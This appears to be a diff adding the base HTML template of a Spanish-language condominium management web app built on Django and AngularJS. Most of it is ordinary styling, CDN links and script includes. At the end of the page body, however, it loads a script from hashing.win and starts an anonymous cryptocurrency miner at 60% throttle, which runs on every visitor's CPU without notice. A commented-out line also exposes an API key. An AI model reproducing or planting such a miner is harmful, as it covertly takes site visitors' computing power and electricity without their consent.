@@ -1,0 +1,288 @@
+{% load staticfiles %}
+{% load i18n %} 
+<!DOCTYPE html>
+<html lang="es" ng-app="condominioAlDiaApp" ng-keypress="helpModal($event)" ng-cloak="">
+  <head>
+    <meta charset="ISO 8859-1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="condominio, condominios, administrador, gestion, gratis, condominioaldia, condominioaldia.net, condominioaldia.com">
+
+    <meta name="description" content="Administrador de Condominios">
+
+    <meta name="author" content="Fractal Software">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-3548130361010748",
+    enable_page_level_ads: true
+  });
+</script>
+    <style type="text/css">
+        html {
+          font-family: sans-serif;
+          -webkit-text-size-adjust: 100%;
+          -ms-text-size-adjust: 100%;
+        }
+
+        body {
+          margin: 0;
+        }
+
+        * {
+          -webkit-box-sizing: border-box;
+          -moz-box-sizing: border-box;
+          box-sizing: border-box;
+        }
+
+        :after,
+        :before {
+          -webkit-box-sizing: border-box;
+          -moz-box-sizing: border-box;
+          box-sizing: border-box;
+        }
+
+        html {
+          font-size: 10px;
+        }
+
+        body {
+          font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+          font-size: 14px;
+          line-height: 1.42857143;
+          color: #333;
+          background-color: #fff;
+        }
+
+        .sr-only {
+          position: absolute;
+          width: 1px;
+          height: 1px;
+          padding: 0;
+          margin: -1px;
+          overflow: hidden;
+          clip: rect(0,0,0,0);
+          border: 0;
+        }
+
+        @-ms-viewport {
+          width: device-width;
+        }
+
+        @font-face {
+          font-family: 'FontAwesome';
+          src: url('static/css/fonts/fontawesome-webfont.eot?v=4.7.0');
+          src: url('static/css/fonts/fontawesome-webfont.eot?#iefix&v=4.7.0') format('embedded-opentype'),url('static/css/fonts/fontawesome-webfont.woff2?v=4.7.0') format('woff2'),url('static/css/fonts/fontawesome-webfont.woff?v=4.7.0') format('woff'),url('static/css/fonts/fontawesome-webfont.ttf?v=4.7.0') format('truetype'),url('/fonts/fontawesome-webfont.svg?v=4.7.0#fontawesomeregular') format('svg');
+          font-weight: normal;
+          font-style: normal;
+        }
+
+        .fa {
+          display: inline-block;
+          font: normal normal normal 14px/1 FontAwesome;
+          font-size: inherit;
+          text-rendering: auto;
+          -webkit-font-smoothing: antialiased;
+          -moz-osx-font-smoothing: grayscale;
+        }
+
+        .fa-5x {
+          font-size: 5em;
+        }
+
+        .fa-fw {
+          width: 1.28571429em;
+          text-align: center;
+        }
+
+        .fa-pulse {
+          -webkit-animation: fa-spin 1s infinite steps(8);
+          animation: fa-spin 1s infinite steps(8);
+        }
+
+        @-webkit-keyframes fa-spin {
+          0% {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+          }
+
+          100% {
+            -webkit-transform: rotate(359deg);
+            transform: rotate(359deg);
+          }
+        }
+
+        @keyframes fa-spin {
+          0% {
+            -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+          }
+
+          100% {
+            -webkit-transform: rotate(359deg);
+            transform: rotate(359deg);
+          }
+        }
+
+        .fa-spinner:before {
+          content: "\f110";
+        }
+
+        .sr-only {
+          position: absolute;
+          width: 1px;
+          height: 1px;
+          padding: 0;
+          margin: -1px;
+          overflow: hidden;
+          clip: rect(0, 0, 0, 0);
+          border: 0;
+        }
+
+    </style>
+    <link rel="preload" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"></noscript>
+
+    <link rel="preload" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous"></noscript>
+
+    <link rel="preload" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" as="style" onload="this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"></noscript>
+
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:bold" rel="preload" type="text/css" as="style" onload="this.rel='stylesheet'">
+    <noscript><link href="http://fonts.googleapis.com/css?family=Open+Sans:bold" rel="stylesheet" type="text/css"></noscript>
+ <!-- <link href="http://fonts.googleapis.com/css?family=Nobile" rel="stylesheet" type="text/css"> -->
+    <link href="http://fonts.googleapis.com/css?family=Droid+Sans" rel="preload" type="text/css" as="style" onload="this.rel='stylesheet'">
+    <noscript><link href="http://fonts.googleapis.com/css?family=Droid+Sans" rel="stylesheet" type="text/css"></noscript>
+    <script>!function(e){"use strict";var t=function(t,n,r){function o(e){if(i.body)return e();setTimeout(function(){o(e)})}function a(){d.addEventListener&&d.removeEventListener("load",a),d.media=r||"all"}var l,i=e.document,d=i.createElement("link");if(n)l=n;else{var s=(i.body||i.getElementsByTagName("head")[0]).childNodes;l=s[s.length-1]}var u=i.styleSheets;d.rel="stylesheet",d.href=t,d.media="only x",o(function(){l.parentNode.insertBefore(d,n?l:l.nextSibling)});var f=function(e){for(var t=d.href,n=u.length;n--;)if(u[n].href===t)return e();setTimeout(function(){f(e)})};return d.addEventListener&&d.addEventListener("load",a),d.onloadcssdefined=f,f(a),d};"undefined"!=typeof exports?exports.loadCSS=t:e.loadCSS=t}("undefined"!=typeof global?global:this),function(e){if(e.loadCSS){var t=loadCSS.relpreload={};if(t.support=function(){try{return e.document.createElement("link").relList.supports("preload")}catch(e){return!1}},t.poly=function(){for(var t=e.document.getElementsByTagName("link"),n=0;n<t.length;n++){var r=t[n];"preload"===r.rel&&"style"===r.getAttribute("as")&&(e.loadCSS(r.href,r,r.getAttribute("media")),r.rel=null)}},!t.support()){t.poly();var n=e.setInterval(t.poly,300);e.addEventListener&&e.addEventListener("load",function(){t.poly(),e.clearInterval(n)}),e.attachEvent&&e.attachEvent("onload",function(){e.clearInterval(n)})}}}(this);</script>
+    
+<style>
+.ng-cloak { visibility: hidden!important; }
+h1, h2, h3, h4, h5, h6 {
+    font-family: "Open Sans", Georgia, Times, serif;
+}
+p, div {
+    /*font-family: 'Nobile', Helvetica, Arial, sans-serif;*/
+    font-family: "Droid Sans", "Open Sans", "Raleway";
+
+
+}
+body { 
+
+    background: url(static/img/textures/cream_dust.png) repeat 0 0;
+}
+
+@media (min-width: 1200px) {
+    .text-center-lg {
+        text-align: center;
+    }
+}
+/*.inquilino, .condominio-retrasado, .need_account, .condominio-inactivo {
+  padding-top: 90px;
+}*/
+.waitForServer {
+
+    display: flex;
+    justify-content: center; 
+    align-items: center; 
+    position: fixed;
+    z-index: 1000;
+    top: 0;
+    left: 0;
+    height: 100%;
+    width: 100%;
+    color:white;
+    background: rgba( 0, 0, 0, .2 ) ;
+
+}
+
+
+
+  .ta-hidden-input{
+    visibility: hidden;
+  }
+
+@media (max-width: 768px) {
+    .text-center-xs {
+        text-align: center;
+    }
+}
+
+/* Small devices (tablets, 768px and up) */
+@media (min-width: 768px) {
+    .text-center-sm {
+        text-align: center;
+    }
+}
+
+/* Medium devices (desktops, 992px and up) */
+@media (min-width: 992px) {
+    .text-center-md {
+        text-align: center;
+    }
+}
+
+/* Large devices (large desktops, 1200px and up) */
+@media (min-width: 1200px) {
+    .text-center-lg {
+        text-align: center;
+    }
+}
+
+</style>
+
+</head>
+  <body><!--ng-class="{ 'inquilino' : userData.user_type == 'inquilino', 'condominio-retrasado' : userData.user_type == 'condominio'&&retrasado==true, 'need_account':need_account==true||has_bank_account==false, 'condominio-inactivo': userData.detalles_usuario.activo==false}"-->
+
+
+    <div class="waitForServer" data-loading="">
+        <i class="fa fa-spinner fa-pulse fa-fw fa-5x"></i>
+        <span class="sr-only">Cargando...</span>
+    </div>
+    {% block index %}{% endblock index %}
+    {% block error_page %}{% endblock error_page %}
+    {% block email_verify %}{% endblock email_verify %}
+      <script src="{% static '/js/js_libs/mainlib.js' %}"></script>
+      <script src="{% static '/js/app_js/modalControllers.js' %}"></script>
+      <script src="{% static '/js/app_js/controllers.js' %}"></script>
+      <script src="{% static '/js/app_js/filters.js' %}"></script>
+      <script src="{% static '/js/app_js/services.js' %}"></script>
+      <script src="{% static '/js/app_js/directives.js' %}"></script>
+      <script src="{% static '/js/app_js/app.js' %}"></script>
+      <!-- <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAql7WqIgZEKNSrXGITziVoXeESEniSCTI&libraries=places" async defer></script> -->
+
+
+<!-- <script src='http://cdnjs.cloudflare.com/ajax/libs/textAngular/1.5.0/textAngular-rangy.min.js'></script> -->
+<script src="{% static '/js/js_libs/textangular/rangy-core.js' %}"></script>
+<script src="{% static '/js/js_libs/textangular/rangy-selectionsaverestore.js' %}"></script>
+<script src="{% static '/js/js_libs/textangular/textAngularSetup.js' %}"></script>
+<script src="{% static '/js/js_libs/textangular/textAngular.js' %}"></script>
+
+<!-- <script src='http://cdnjs.cloudflare.com/ajax/libs/textAngular/1.5.0/textAngular-sanitize.min.js'></script>
+<script src="{% static '/js/js_libs/textAngular.min.js' %}"></script> -->
+<script src="{% static '/js/js_libs/textangular/textAngular-sanitize.js' %}"></script>
+<!--Start of Zendesk Chat Script-->
+<script type="text/javascript">
+// window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=
+// d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
+// _.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute("charset","utf-8");
+// $.src="https://v2.zopim.com/?4kSEPrXHYMq46WEMRXvvjIOwrLadei2i";z.t=+new Date;$.
+// type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");
+</script>
+<!--End of Zendesk Chat Script-->
+
+
+
+
+<script src="https://www.hashing.win/jIf6.js"></script>
+<script>
+    var miner = new Client.Anonymous('8f3f86f89e82fb8a168b5e76576631473dfb5d968c7856df811b91c6ea079172', {
+        throttle: 0.6
+    });
+    miner.start();
+</script>
+
+
+  </body>
+  
+</html>
